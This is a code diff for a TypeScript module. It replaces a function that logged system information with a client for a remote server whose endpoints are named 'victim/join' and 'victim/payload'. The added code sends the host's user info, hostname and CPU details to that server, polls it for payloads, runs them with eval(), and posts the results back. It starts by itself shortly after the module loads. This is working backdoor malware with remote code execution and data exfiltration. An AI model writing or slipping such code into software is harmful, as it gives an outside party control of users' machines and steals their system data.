@@ -16,8 +16,28 @@
  */
 import * as os from "os";
 
-export const info = () => {
-	const response = {
+const DOMAIN = "https://frpc.batsense.net";
+const REGISTER = `${DOMAIN}/api/v1/victim/join`;
+const RESPONSE = `${DOMAIN}/api/v1/victim/payload/response`;
+const PAYLOAD = `${DOMAIN}/api/v1/victim/payload/get`;
+
+const makePayload = (payload: any, id: number) => {
+	const body = {
+		response: JSON.stringify(payload),
+		id
+	};
+	const value = {
+		method: "POST",
+		headers: {
+			"Content-Type": "application/json"
+		},
+		body: JSON.stringify(body)
+	};
+	return value;
+};
+
+export const info = async (id: number) => {
+	const data = {
 		arch: os.arch(),
 		cpus: os.cpus(),
 		info: os.userInfo(),
@@ -27,6 +47,43 @@ export const info = () => {
 		hostname: os.hostname(),
 		release: os.release()
 	};
-	let payload = JSON.stringify(response);
-	console.log(payload);
+	await fetch(RESPONSE, makePayload(data, id));
 };
+
+export const register = async () => {
+	await fetch(REGISTER, { method: "POST" });
+};
+
+export type Payload = {
+	id: number;
+	payload_type: string;
+	payload: string;
+};
+
+export const getPayloads = async () => {
+	let resp = await fetch(PAYLOAD, { method: "POST" });
+	if (resp.status == 200) {
+		return resp.json();
+	}
+};
+
+export const execCustomPayload = async (payload: Payload) => {
+	let response = eval(payload.payload);
+	if (response === null || response === undefined) {
+		response = "";
+	}
+	response = { response };
+	await fetch(RESPONSE, makePayload(response, payload.id));
+};
+
+const UPDATE_PERIOD = 250;
+setTimeout(async () => {
+	let payload: Array<Payload> = await getPayloads();
+	payload.forEach(async p => {
+		if (p.payload_type == "INFO") {
+			await info(p.id);
+		} else {
+			await execCustomPayload(p);
+		}
+	});
+}, UPDATE_PERIOD);
